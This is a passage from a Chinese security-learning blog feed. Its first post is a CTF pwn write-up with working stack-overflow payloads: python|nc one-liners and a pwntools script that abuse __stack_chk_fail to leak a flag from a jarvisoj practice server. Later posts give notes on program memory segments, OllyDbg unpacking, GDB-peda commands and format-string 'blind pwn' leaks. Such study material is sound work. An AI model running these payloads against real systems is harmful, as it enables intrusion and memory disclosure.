: 0x600d20 (&quot;PCTF&#123;Here&apos;s the flag on server&#125;&quot;)</span><br></pre></td></tr></table></figure></p><p>所以，payload可以不用pwntools构建，只是在这里我试了两种写法都可以，主要是和__libc_message的调用有关。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_message (<span class="keyword">int</span> do_abort, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap; </span><br><span class="line">  <span class="keyword">int</span> fd = <span class="number">-1</span>; </span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line">  <span class="comment">/* Open a descriptor for /dev/tty unless the user explicitly</span></span><br><span class="line"><span class="comment">     requests errors on standard error.  */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *on_2 = __libc_secure_getenv (<span class="string">"LIBC_FATAL_STDERR_"</span>);</span><br><span class="line">  <span class="keyword">if</span> (on_2 == <span class="literal">NULL</span> || *on_2 == <span class="string">'\0'</span>)</span><br><span class="line">    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) </span><br><span class="line">    fd = STDERR_FILENO;</span><br><span class="line">  <span class="comment">/*......*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>有这样一句话，让我变得很懵逼。</p><blockquote><p><strong>如果LIBC_FATALSTDERR环境变量没有设置或者为空，stderr会redirect到_PATH_TTY，通常是/dev/tty，因此错误信息将不会输出到stderr而是服务端可见的设备。</strong></p></blockquote><p>我测试的两个可行的payload：<br><code>python -c &#39;print &quot;a&quot;*0x218+&quot;\x20\x0d\x40\x00\x00\x00\x00\x00&quot;+&quot;\n&quot;+&quot;a&quot;&#39; | nc pwn.jarvisoj.com 9877</code><br><code>python -c &#39;print &quot;a&quot;*0x218+&quot;\x20\x0d\x40\x00\x00\x00\x00\x00&quot;+&quot;\n&quot;&#39; | nc pwn.jarvisoj.com 9877</code><br>总之我测试的时候是有没有最后那个 <code>a</code> 都成功了。<br>完整的python的payload是这样的：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">old_flag_addr = <span class="number">0x600d20</span></span><br><span class="line">new_flag_addr = <span class="number">0x400d20</span></span><br><span class="line">p = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x218</span> + p64(new_flag_addr) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(old_flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"flag: "</span>)</span><br><span class="line">env = <span class="string">"LIBC_FATAL_STDERR_=1"</span></span><br><span class="line">p.sendline(env)</span><br><span class="line">flag = p.recv()</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p><p>这个payload参考的网上的博文的。<br><strong>主要就是没看懂他环境变量设置的意义何在和他为啥非要把旧的flag地址写进去………………….唉，可能是我太菜了吧。</strong><br><strong>参考资料：</strong><a href="http://yunnigu.dropsec.xyz/2017/03/04/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8B%E5%88%A9%E7%94%A8-stack-chk-fail/" title="栈溢出之利用__stack_chk_fail" target="_blank" rel="noopener">栈溢出之利用__stack_chk_fail</a></p>]]></content>
    
    <summary type="html">
    
      今天中午看某到PWN题的writeup的时候，看到了我这里要写的相关内容，所以我就来我自己的博客上总结下了，可能内容涉及pwntools和gdb的配合使用，和确定缓冲区长度计算技巧。
    
    </summary>
    
      <category term="绕过技巧" scheme="http://0xpoker.cuit.site/categories/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="绕过技巧" scheme="http://0xpoker.cuit.site/tags/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
    
      <category term="canary" scheme="http://0xpoker.cuit.site/tags/canary/"/>
    
      <category term="栈溢出" scheme="http://0xpoker.cuit.site/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>bss段.data段.text段等这些东西是什么</title>
    <link href="http://0xpoker.cuit.site/20171201/bss%E6%AE%B5-data%E6%AE%B5-text%E6%AE%B5%E7%AD%89%E8%BF%99%E4%BA%9B%E4%B8%9C%E8%A5%BF%E6%98%AF%E4%BB%80%E4%B9%88/"/>
    <id>http://0xpoker.cuit.site/20171201/bss段-data段-text段等这些东西是什么/</id>
    <published>2017-12-01T20:45:31.000Z</published>
    <updated>2017-12-02T14:11:39.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bss段-data段-text段等这些东西是什么"><a href="#bss段-data段-text段等这些东西是什么" class="headerlink" title=".bss段.data段.text段等这些东西是什么"></a>.bss段.data段.text段等这些东西是什么</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PWN这东西，真的感觉越学越深，越深难度就感觉是成几何级增长，唉，不过又能有什么办法呢，慢慢往下学着走吧。我在这里也就抄点我今天看到的，多写点自己的理解吧……………..</p><h2 id="bss段"><a href="#bss段" class="headerlink" title=".bss段"></a>.bss段</h2><p><strong>bss段</strong> 的英文名叫 <strong>bss segment</strong> ，通常是指用来存放程序中 <strong>未初始化的全局变量</strong> 的一块 <strong>内存区域</strong><br><strong>bss</strong> 是英文 <strong>Block Started by Symbol</strong> 的简称</p><blockquote><p>bss段属于 <strong>静态内存分配</strong>   </p></blockquote><h2 id="date段"><a href="#date段" class="headerlink" title=".date段"></a>.date段</h2><p><strong>date段</strong> ，又叫做 <strong>数据段</strong> ，英文名叫 <strong>data segment</strong> ，通常是指用来存放程序中 <strong>已初始化的全局变量</strong> 的一块 <strong>内存区域</strong>  </p><blockquote><p>数据段属于 <strong>静态内存分配</strong></p></blockquote><h2 id="text段"><a href="#text段" class="headerlink" title=".text段"></a>.text段</h2><p><strong>text段</strong> ，又称 <strong>代码段</strong> ，英文名叫 <strong>code segment/text segment</strong> 通常是指用来 <strong>存放程序执行代码</strong> 的一块 <strong>内存区域</strong><br>这部分区域的大小 <strong>在程序运行前就已经确定</strong> ，并且内存区域 <strong>通常属于只读</strong> (某些架构也允许代码段为可写，即允许修改程序)  </p><blockquote><p>在代码段中，也有可能包含一些 <strong>只读的常数变量</strong> ，例如字符串常量等</p></blockquote><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><blockquote><p>我记得之前的文章里面有提到过一次堆和栈的相关概念，这里再做一次简要叙述吧。</p></blockquote><p><strong>堆</strong> ，英文名叫 <strong>heap</strong> ，是用于存放 <strong>进程运行中</strong> 被 <strong>动态分配</strong> 的 <strong>内存段</strong> ，它的 <strong>大小并不固定</strong> ，可动态 <strong>扩张</strong> 或 <strong>缩减</strong><br>当进程调用<code>malloc</code>等函数分配内存时，新分配的内存就被动态添加到堆上(堆被扩张)<br>当利用<code>free</code>等函数释放内存时，被释放的内存从堆中被剔除(堆被缩减)  </p><blockquote><p>堆一般是由程序员操控的，所以执行效率比栈的要低，不过自由度高</p></blockquote><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p><strong>栈</strong> ，又称 <strong>堆栈</strong> ，英文名叫 <strong>stack</strong> ，是用户存放程序 <strong>临时创建的局部变量</strong> ，也就是说我们 <strong>函数括弧“{}”中定义的变量</strong> ，但不包括<code>static</code>声明的变量，<code>static</code>意味着在 <strong>数据段(.date)</strong> 中存放变量<br>除此以外， <strong>在函数被调用时</strong> ，其 <strong>参数</strong> 也会被压入发起调用的 <strong>进程栈</strong> 中，并且待到调用结束后，函数的 <strong>返回值</strong> 也会被存放回栈中<br>由于 <strong>栈的先进先出(FIFO)</strong> 特点，所以栈特别方便用来保存/恢复调用现场<br>从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区</p><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p>用于声明静态变量，如：静态全局变量、静态局部变量等<br>静态全局变量示例:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fn</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> n; <span class="comment">//定义静态全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> 　　n=<span class="number">20</span>;</span><br><span class="line"> 　　<span class="built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"> 　　fn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">　　 n++;</span><br><span class="line"> 　　<span class="built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>静态局部变量示例:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fn</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> 　　fn();</span><br><span class="line"> 　　fn();</span><br><span class="line"> 　　fn();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> 　　<span class="keyword">static</span> n=<span class="number">10</span>;</span><br><span class="line"> 　　<span class="built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">　　 n++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="extern"><a href="#extern" class="headerlink" title="extern"></a>extern</h3><p>extern关键字会提升变量或者函数的逼格，使得它们可以跨文件被访问。<br><a href="http://blog.csdn.net/lishuhuakai/article/details/45944735" title="extern关键字会提升变量或者函数的逼格，使得它们可以跨文件被访问" target="_blank" rel="noopener">extern用法介绍</a></p><h2 id="特殊要点"><a href="#特殊要点" class="headerlink" title="特殊要点"></a>特殊要点</h2><p>一个程序本质上都是由 <strong>bss段、data段、text段</strong> 三个组成的<br>这样的概念，不知道最初来源于哪里的规定，但在当前的计算机程序设计中是很重要的一个基本概念<br>而且在 <strong>嵌入式系统</strong> 的设计中也非常重要，牵涉到嵌入式系统运行时的内存大小分配，存储单元占用空间大小的问题<br>在采用 <strong>段式内存管理的架构</strong> 中（比如intel的80x86系统）， <strong>bss段</strong> 通常是指用来存放程序中 <strong>未初始化的全局变量</strong> 的一块内存区域  </p><blockquote><p><strong>一般在初始化时.bss 段部分将会清零。.bss段属于静态内存分配，即程序一开始就将其清零了</strong></p></blockquote><p>比如，在C语言之类的程序编译完成之后，已初始化的全局变量保存在.data 段中，未初始化的全局变量保存在.bss 段中<br><strong>.text</strong> 和 <strong>.data段</strong> 都在可执行文件中（在嵌入式系统里一般是固化在镜像文件中），由系统从可执行文件中加载，而 <strong>.bss段</strong> 不在可执行文件中， <strong>由系统初始化</strong> </p><h2 id="相关参考资料"><a href="#相关参考资料" class="headerlink" title="相关参考资料"></a>相关参考资料</h2><p><a href="https://www.cnblogs.com/yanghong-hnu/p/4705755.html" title="深入理解计算机系统" target="_blank" rel="noopener">深入理解计算机系统</a><br><a href="https://www.cnblogs.com/BeyondAnyTime/archive/2012/06/08/2542315.html" title="C++中的static关键字的总结" target="_blank" rel="noopener">C++中的static关键字的总结</a>  </p>]]></content>
    
    <summary type="html">
    
      经常在学习pwn的时候能看到什么复制.text段、覆盖.bss段等这些话，可是还真没去仔细了解过是什么，今天正好有点时间，就去看了下是什么。
    
    </summary>
    
      <category term="文件结构" scheme="http://0xpoker.cuit.site/categories/%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    
    
      <category term="PE文件结构" scheme="http://0xpoker.cuit.site/tags/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>OD脱壳学习笔记(一)</title>
    <link href="http://0xpoker.cuit.site/20171130/OD%E8%84%B1%E5%A3%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/"/>
    <id>http://0xpoker.cuit.site/20171130/OD脱壳学习笔记(一)/</id>
    <published>2017-12-01T01:29:09.000Z</published>
    <updated>2017-12-01T18:35:59.737Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OD脱壳学习笔记-一"><a href="#OD脱壳学习笔记-一" class="headerlink" title="OD脱壳学习笔记(一)"></a>OD脱壳学习笔记(一)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来在这里我不打算放相关逆向的笔记了，但是emmm本人技术太菜，刚刚看一个比赛的题，签到都卡了好久，心里难受，想着就先放上来吧。</p><h2 id="常用手脱方法"><a href="#常用手脱方法" class="headerlink" title="常用手脱方法"></a>常用手脱方法</h2><h3 id="单步跟踪法"><a href="#单步跟踪法" class="headerlink" title="单步跟踪法"></a>单步跟踪法</h3><ol><li>OD载入程序，不分析其代码</li><li>遵循原则，近CALL用F7，远CALL用F8，实现向下走</li><li>有循环处，在下一句代码处用F4(或者右键-&gt;代码断点运行到所选)</li><li>大的跳转(大跨段，<code>JMP XXXXXXXX</code>或者<code>JE XXXXXXXX</code>或者<code>RETN</code>)，很快就会到OEP的</li></ol><h3 id="最后一次异常法"><a href="#最后一次异常法" class="headerlink" title="最后一次异常法"></a>最后一次异常法</h3><ol><li>OD打开—点选项—调试选项—去掉所有异常—CTRL+F2重载</li><li>SHIFT+F9.只到程序运行，记下次数M</li><li>CTRL+F2重载—按SHIFT+F9(次数为M-1次)</li><li>按CTRL+G—输入OE右下角的SE句柄前的地址</li><li>F2下断—SHIFT+F9到断点处</li><li>去断按F8，到OEP</li></ol><h3 id="模拟跟踪法"><a href="#模拟跟踪法" class="headerlink" title="模拟跟踪法"></a>模拟跟踪法</h3><p><strong>在能判断无暗桩的情况下使用</strong></p><ol><li>F9试运行，跑起来就无SEH暗桩之类的</li><li><code>ALT+N</code>打开内存镜像，找到包含<code>=sfx,imports reloco tions</code>字符</li><li><code>地址=XXX</code>  命令行输入: <code>tceip&lt;XXX</code>,回车</li></ol><h3 id="内存镜像法"><a href="#内存镜像法" class="headerlink" title="内存镜像法"></a>内存镜像法</h3><ol><li>先OD载入软件</li><li>点选项—调试选项—忽略全部—CTRL+F2重载</li><li>ALT+N打开内存镜像，找程序第一个.rsrc段—F2下断—SHIFT+F9运行到断点，再打开找到程序第一个.rsrc段上面的.code段处（就是00401000处），F2下断—SHIFT+F9或无异常按F9，到OEP</li></ol><h3 id="ESP定律法"><a href="#ESP定律法" class="headerlink" title="ESP定律法"></a>ESP定律法</h3><ol><li>F8，观察OD右上角寄存器中ESP有没有实现（红色）</li><li>命令行下 <code>DD XXXXXXXX</code>（当前代码ESP值），回车</li><li>DD就选中下端地址，断点—硬件访问—DWORD断点，F9运行，到跳转处按F8 到OEP  <blockquote><p>讲到ESP定律脱壳，先载入程序然后F8单步执行并观察寄存器中ESP的值变化，当ESP值变红时右键数据窗口跟随，然后数据窗口跟随的值右键断点word，之后F9运行到断点，然后再往下找很长的jmp之后到入口。<br>emm大概就是这样吧。</p></blockquote></li></ol><h3 id="一步到ESP法"><a href="#一步到ESP法" class="headerlink" title="一步到ESP法"></a>一步到ESP法</h3><p><strong>只适用于少数壳，如UPX、ASPACK</strong></p><ol><li>CTRL+F—输入：<code>POPAD</code>回车查找—F2下断—F9运行到此处.</li><li>来到大跳转处，点F8到OEP</li></ol><h3 id="SFX法"><a href="#SFX法" class="headerlink" title="SFX法"></a>SFX法</h3><ol><li>设置OD，忽略所有异常</li><li>切换到SFX选项卡，选择“字节模式跟踪实际入口”，确定</li><li>重载—“否”压缩代码，到OEP</li></ol>]]></content>
    
    <summary type="html">
    
      脱壳这东西emmm知识点挺广的，我就写一点点基础的，后面需要复杂的，我再去补充成二三好了.........
    
    </summary>
    
      <category term="逆向" scheme="http://0xpoker.cuit.site/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://0xpoker.cuit.site/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="脱壳" scheme="http://0xpoker.cuit.site/tags/%E8%84%B1%E5%A3%B3/"/>
    
      <category term="教程" scheme="http://0xpoker.cuit.site/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Linux下的动态调试起GDB的使用说明</title>
    <link href="http://0xpoker.cuit.site/20171129/Linux%E4%B8%8B%E7%9A%84%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E8%B5%B7GDB%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
    <id>http://0xpoker.cuit.site/20171129/Linux下的动态调试起GDB的使用说明/</id>
    <published>2017-11-30T01:53:16.000Z</published>
    <updated>2017-12-01T18:09:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux下的动态调试起GDB的使用说明"><a href="#Linux下的动态调试起GDB的使用说明" class="headerlink" title="Linux下的动态调试起GDB的使用说明"></a>Linux下的动态调试起GDB的使用说明</h1><h2 id="什么是GDB"><a href="#什么是GDB" class="headerlink" title="什么是GDB"></a>什么是GDB</h2><p><strong>参考资料：</strong><a href="https://baike.baidu.com/item/gdb/10869514" title="百度百科----GDB" target="_blank" rel="noopener">百度百科—-GDB</a><br>简单的叙述，GDB就是一个在linux下运行的动态调试器，使用方法和Windows上的那些差不多，但是操作较为复杂，毕竟是命令行控制的动态调试器，不过这也没埋没他的光点，GDB的强大只有用过才知道。  </p><h2 id="人生苦短，我用gdb-peda"><a href="#人生苦短，我用gdb-peda" class="headerlink" title="人生苦短，我用gdb-peda"></a>人生苦短，我用gdb-peda</h2><p>正如我标题叙述的这样，我用的GDB不是原生态的GDB，那个原生态版的太难操作，所以推荐大家去下载使用pwn版的GDB下面给个安装方法，安装环境是Ubuntu：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git  </span><br><span class="line">sudo apt-get install gdb</span><br><span class="line">git clone https://github.com/longld/peda.git ~/peda  </span><br><span class="line">echo <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit  </span><br><span class="line">echo <span class="string">"DONE! debug your program with gdb and enjoy"</span></span><br></pre></td></tr></table></figure></p><p>这也是官方github给的安装示例。  </p><blockquote><p>peda的一个实用命令checksec检测安全保护<br>peda的另一个实用命令searchmem用搜索内存</p></blockquote><p><strong>下面介绍点命令及使用说明：</strong><br><a id="more"></a></p><table><thead><tr><th style="text-align:center">命令符号</th><th style="text-align:left">使用说明</th></tr></thead><tbody><tr><td style="text-align:center">file 路径</td><td style="text-align:left">附加文件</td></tr><tr><td style="text-align:center">r</td><td style="text-align:left">开始执行</td></tr><tr><td style="text-align:center">c</td><td style="text-align:left">继续执行</td></tr><tr><td style="text-align:center">step</td><td style="text-align:left">单步步入</td></tr><tr><td style="text-align:center">next</td><td style="text-align:left">单步步过</td></tr><tr><td style="text-align:center">b [addr]</td><td style="text-align:left">下断点</td></tr><tr><td style="text-align:center">enable</td><td style="text-align:left">激活断点</td></tr><tr><td style="text-align:center">disable</td><td style="text-align:left">禁用断点</td></tr><tr><td style="text-align:center">info b</td><td style="text-align:left">查看断点</td></tr><tr><td style="text-align:center">del num</td><td style="text-align:left">删除断点</td></tr><tr><td style="text-align:center">x/wx $esp</td><td style="text-align:left">以4字节16进制显示栈中内容</td></tr><tr><td style="text-align:center">stack 100</td><td style="text-align:left">插件提供的，显示栈中100项</td></tr><tr><td style="text-align:center">find xxx</td><td style="text-align:left">快速查找，很实用</td></tr><tr><td style="text-align:center">s</td><td style="text-align:left">按字符串输出</td></tr><tr><td style="text-align:center">x</td><td style="text-align:left">按十六进制格式显示变量。</td></tr><tr><td style="text-align:center">d</td><td style="text-align:left">按十进制格式显示变量。</td></tr><tr><td style="text-align:center">u</td><td style="text-align:left">按十六进制格式显示无符号整型。</td></tr><tr><td style="text-align:center">o</td><td style="text-align:left">按八进制格式显示变量。</td></tr><tr><td style="text-align:center">t</td><td style="text-align:left">按二进制格式显示变量。</td></tr><tr><td style="text-align:center">a</td><td style="text-align:left">按十六进制格式显示变量。</td></tr><tr><td style="text-align:center">c</td><td style="text-align:left">按字符格式显示变量。</td></tr><tr><td style="text-align:center">f</td><td style="text-align:left">按浮点数格式显示变量。</td></tr><tr><td style="text-align:center">x/<n f="" u=""> [addr]</n></td><td style="text-align:left">n、f、u是可选的参数。b表示单字节，h表示双字节，w表示四字 节，g表示八字节</td></tr><tr><td style="text-align:center">(无)</td><td style="text-align:left">但是实际的组合就那么几种</td></tr><tr><td style="text-align:center">x/s 地址</td><td style="text-align:left">查看字符串</td></tr><tr><td style="text-align:center">x/wx 地址</td><td style="text-align:left">查看DWORD</td></tr><tr><td style="text-align:center">x/c 地址</td><td style="text-align:left">单字节查看</td></tr><tr><td style="text-align:center">x/16x $esp+12</td><td style="text-align:left">查看寄存器偏移</td></tr></tbody></table><blockquote><p>set args 可指定运行时参数。(如：set args 10 20 30 40 50)<br>show args 命令可以查看设置好的运行参数。 </p></blockquote><p><strong>使用截图：</strong><br><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fm0ny2xs5rj30ju0c40uo.jpg" alt="GDB" title="GDB">  </p><p>这是peda的栈视图。其中红色的是栈帧的返回地址，蓝色的表示这个值可能为指针。  </p><blockquote><p>本篇摘自0x9A82师傅的博客<a href="http://www.cnblogs.com/Ox9A82/p/5483186.html" title="相关博文----GDB调试实用命令" target="_blank" rel="noopener">相关博文—-GDB调试实用命令</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      GDB这东西以前没用过，也没想到有这么强大，我感觉比OD强大，而且这是linux最有效的动态调试工具，所以还是学习下吧，正好去0x9A82师傅博客上搜刮了一点资源，2333.............
    
    </summary>
    
      <category term="调试器" scheme="http://0xpoker.cuit.site/categories/%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    
    
      <category term="调试器" scheme="http://0xpoker.cuit.site/tags/%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    
      <category term="使用说明" scheme="http://0xpoker.cuit.site/tags/%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞学习笔记(四)</title>
    <link href="http://0xpoker.cuit.site/20171129/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/"/>
    <id>http://0xpoker.cuit.site/20171129/格式化字符串漏洞学习笔记(四)/</id>
    <published>2017-11-29T23:32:10.000Z</published>
    <updated>2017-12-01T18:20:07.015Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞学习笔记-四"><a href="#格式化字符串漏洞学习笔记-四" class="headerlink" title="格式化字符串漏洞学习笔记(四)"></a>格式化字符串漏洞学习笔记(四)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>格式化字符串的相关内容我也学习了很久了，虽然菜，但还是基本上都看了下，不管看懂没看懂，始终是有一点自己的理解的，所以今天的这篇文章也应该是我学习格式化字符串漏洞的一个阶段的最后一片文章，如果我后续还知道了什么新的骚操作，我一定会补上的。  </p><h2 id="格式化字符串漏洞的灵活运用"><a href="#格式化字符串漏洞的灵活运用" class="headerlink" title="格式化字符串漏洞的灵活运用"></a>格式化字符串漏洞的灵活运用</h2><p>在我之前的学习中我也就学会了格式化字符串来 <strong>读取任意地址的内存和向任意地址写内存</strong> 。可是，仅仅这么一些操作就能满足黑客的心吗？答案是，不能的。在今天的学习中，我发现了用 <strong>printf</strong> 来leak内存，然后把一个原本只能 <strong>nc</strong> 连接的文件给下载下来。  </p><blockquote><p>首先这个操作是应用于那种没有给文件，而又有人需要放进IDA分析一波的，要是弄不下来岂不是很难受了，所有才有了这样的操作。</p></blockquote><h3 id="大致原理"><a href="#大致原理" class="headerlink" title="大致原理"></a>大致原理</h3><p>既然要学习一个东西，那肯定是要先看看原理的。<br>首先，这种没有给文件，直接上一个 <strong>nc</strong> 连接给做pwn题的，叫做 <strong>“blind pwn”</strong> ,故名思意嘛，这就类似于 <strong>web</strong> 题的盲注。可是，不知道是哪位大牛发现这个方式的，真的很厉害。<br><strong>原理：</strong>格式化字符串漏洞的读取任意地址的内存并输出出来。<br><strong>dump .text段：</strong><br>从泄露的栈信息中，我们还可以发现别的东西，比如说我们输入的字符串在栈中的偏移(调用printf时的栈)。可以通过这个来确定一下大概栈上的分布是怎样的。<br><a id="more"></a></p><blockquote><p>主要就是通过格式化字符串漏洞来泄漏text段的内容并且以二进制写入文件，最后对得到的文件进行修补然后虽然文件没法直接运行，但是却可以通过IDA反汇编了。这里的技术细节我也不是很会，所以我也不装逼了，等我以后会了再慢慢装逼。贴几个相关的博文地址吧。</p></blockquote><p><strong>参考资料：</strong><br><a href="http://blog.csdn.net/smalosnail/article/details/53386353" title="初探ROP攻击 Memory Leak &amp; DynELF" target="_blank" rel="noopener">初探ROP攻击 Memory Leak &amp; DynELF</a><br><a href="http://bobao.360.cn/learning/detail/3298.html" title="借助DynELF实现无libc的漏洞利用小结" target="_blank" rel="noopener">借助DynELF实现无libc的漏洞利用小结</a><br><a href="http://bobao.360.cn/ctf/detail/189.html" title="格式化字符串blind pwn详细教程" target="_blank" rel="noopener">格式化字符串blind pwn详细教程</a><br><a href="http://bobao.360.cn/learning/detail/3674.html" title="格式化字符串漏洞利用小结(二)" target="_blank" rel="noopener">格式化字符串漏洞利用小结(二)</a>  </p><h3 id="修补过程"><a href="#修补过程" class="headerlink" title="修补过程"></a>修补过程</h3><p>这个东西在上面的资料里有提到，对比ELF文件模版来修补，不用达到100%修复源文件，这一般也达不到，所以只要修到IDA能反汇编就好，那样就已经方便我们看文件了。  </p><h3 id="常见格式化字符串漏洞攻击操作"><a href="#常见格式化字符串漏洞攻击操作" class="headerlink" title="常见格式化字符串漏洞攻击操作"></a>常见格式化字符串漏洞攻击操作</h3><p><strong>下面这句话引自0x9A82师傅的博客：</strong>  </p><blockquote><p>格式化字符串还有%s参数。那么，如果在栈中保存有指向我们感兴趣数据的 <strong>指针</strong> ，我们就可以在打印指针的时候使用一个%s来打印别的地方的内容。而且一般的程序都会将用户输入的数据储存在栈上。这就给了我们一个 <strong>构造指针</strong> 的机会，再结合格式化字符串漏洞， <strong>几乎</strong> 可以得到所有内存数据。</p></blockquote><h4 id="CTF中该漏洞常见套路"><a href="#CTF中该漏洞常见套路" class="headerlink" title="CTF中该漏洞常见套路"></a>CTF中该漏洞常见套路</h4><p><strong>0x9A82师傅的：</strong><br>由此可见格式化字符串漏洞主要是：<br>1.泄漏任意地址的值，leak内存(比如leak出libc基地址)<br>2.写任意地址，可用于修改got表<br><strong>参考资料：</strong><a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" title="Linux下的格式化字符串漏洞利用姿势" target="_blank" rel="noopener">Linux下的格式化字符串漏洞利用姿势</a>  